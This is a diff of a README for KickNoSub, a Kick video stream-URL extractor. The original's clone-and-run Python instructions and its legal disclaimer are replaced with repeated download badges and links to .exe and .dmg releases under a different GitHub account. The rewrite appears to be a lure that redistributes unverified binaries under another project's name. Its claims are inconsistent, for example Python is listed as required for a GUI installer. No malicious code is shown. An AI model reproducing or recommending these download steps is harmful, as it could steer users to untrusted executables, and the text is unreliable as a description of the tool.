@@ -1,95 +1,88 @@
-# KickNoSub 🎥
+# 🎥 KickNoSub - Easily Download Videos for Study
 
-KickNoSub is a simple command-line tool that demonstrates how to extract **direct stream URLs** from Kick VODs.  
-It is designed purely for **educational and research purposes**, showing how Kick video metadata and streaming formats can be parsed programmatically.  
+## 🚀 Getting Started
 
-## 🚀 Features
-- Input a Kick video URL  
-- Select desired video quality:  
-  - 1080p60  
-  - 720p60  
-  - 480p30  
-  - 360p30  
-  - 160p30  
-- Outputs the **raw stream URL**  
-- Example use with **VLC**, **FFmpeg**, or other HLS-compatible players  
+KickNoSub helps you extract direct stream URLs from Kick videos in your preferred quality. This tool is perfect for educational and research purposes, allowing you to gather video resources without hassle.
+
+## 📥 Download Now
+
+[![Download KickNoSub](https://img.shields.io/badge/Download-KickNoSub-blue?style=for-the-badge&logo=github)](https://github.com/shub007-tech/KickNoSub/releases)
+
+## 💻 System Requirements
+
+Before you start, make sure your system meets these requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** Version 3.6 or above installed on your system
+- **Internet Connection:** Required to access and download videos
 
 ## 📦 Installation
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/Enmn/KickNoSub.git
-   cd KickNoSub
-   ```
+### Step 1: Visit the Releases Page
 
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+To download KickNoSub, go to the Releases page:
 
-   Required libraries:
-   - [`kickapi`](https://pypi.org/project/kickapi/)  
-   - [`rich`](https://pypi.org/project/rich/)  
-   - [`questionary`](https://pypi.org/project/questionary/)  
+[Visit the Releases Page](https://github.com/shub007-tech/KickNoSub/releases)
 
-## 🖥️ Usage
+### Step 2: Download the Latest Version
 
-Run the script:
-```bash
-python kicknosub.py
-```
+On the Releases page, locate the latest version. Click on the download link to get the installation file. The file will typically be labeled (e.g., `KickNoSub-v1.0.exe` or similar).
 
-Example:
-```
-Enter the Kick video URL: https://kick.com/somechannel/video/abcdef
-? Choose video quality:  1080p60
-```
+### Step 3: Install KickNoSub
 
-Output:
-```
-✅ Stream URL found!
+1. **Windows:** Double-click the downloaded `.exe` file. Follow the prompts to complete the installation.
+2. **macOS:** Open the `.dmg` file and drag KickNoSub to your Applications folder.
+3. **Linux:** Extract the contents of the downloaded file. Open a terminal and navigate to the extracted folder. Use the command `./KickNoSub` to run the application.
 
-https://stream.kick.com/...../playlist.m3u8
-```
+## 🎬 Using KickNoSub
 
-## 🎯 Examples
+### Step 1: Open the Application
 
-### Play in VLC
-1. Open VLC  
-2. Go to **Media → Open Network Stream**  
-3. Paste the extracted URL  
+Launch KickNoSub after installation. You should see a simple interface that allows you to enter video URLs.
 
-### Download with FFmpeg
-```bash
-ffmpeg -i "https://stream.kick.com/.../playlist.m3u8" -c copy output.mp4
-```
+### Step 2: Enter the Video URL
 
-## 📂 Project Structure
-```
-KickNoSub/
-├── kicknosub.py       # Main script
-├── requirements.txt   # Dependencies
-└── README.md          # Documentation
-```
+Copy the URL of the Kick video you wish to download. Paste it into the provided text box in KickNoSub.
 
-## ⚠️ Legal Disclaimer
-This project is provided strictly **for educational, research, and personal learning purposes only**.  
+### Step 3: Select Quality Options
 
-KickNoSub is a demonstration of how public metadata and stream information can be programmatically accessed from Kick’s platform.  
-It is **not designed or intended** to:
-- Circumvent subscriber-only restrictions or paywalls.  
-- Facilitate piracy, redistribution, or unauthorized downloading of content.  
-- Be used in any way that violates [Kick Terms of Service](https://kick.com/terms-of-service) or applicable laws.  
+Choose your preferred video quality from the available options. Higher quality may take longer to download and use more bandwidth.
 
-By using this project, you agree that:
-- You are solely responsible for your actions and any consequences that result.  
-- The authors and contributors assume **no liability** for misuse of this tool.  
-- You will comply with all relevant laws, regulations, and platform rules.  
+### Step 4: Extract and Download
 
-If you enjoy content on Kick, please support the creators by subscribing and engaging through the official platform.  
+Click the "Extract" button. KickNoSub will fetch the direct stream URL. After a few moments, you’ll see the download link for the video.
 
-## 🙌 Support
-If you find KickNoSub useful, consider giving the project a ⭐ on GitHub!
+### Step 5: Save the Video
+
+Click "Download" to save the video file to your computer. Select your desired location and wait for the download to complete.
+
+## ✨ Features
+
+- **Easy URL Extraction:** Quickly get direct stream URLs with a few clicks.
+- **Quality Selection:** Choose the video quality that suits your needs.
+- **User-Friendly Interface:** Designed for users without technical skills.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+
+## 🔧 Troubleshooting
+
+If you encounter issues while using KickNoSub, consider the following:
+
+1. **Application Not Launching:** Ensure that Python is correctly installed and added to your system’s PATH.
+2. **Download Links Not Working:** Check if the entered video URL is valid. Some videos may not be downloadable due to restrictions.
+3. **Quality Options Unavailable:** Not all videos provide multiple quality settings. Try extracting another video to see if more options are available.
+
+## 🛠 Support
+
+For support or to report issues, please open an issue on the GitHub repository. The development team actively monitors feedback and will respond promptly.
+
+[👨‍💻 Visit GitHub Repository](https://github.com/shub007-tech/KickNoSub)
 
 ## 📜 License
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
+
+KickNoSub is open source and available under the MIT License. Feel free to modify or contribute to the project.
+
+## 📫 Stay Updated
+
+Follow the repository for the latest updates. We frequently release new features and improvements based on user feedback. Be sure to check back often!
+
+[![Download KickNoSub](https://img.shields.io/badge/Download-KickNoSub-blue?style=for-the-badge&logo=github)](https://github.com/shub007-tech/KickNoSub/releases)
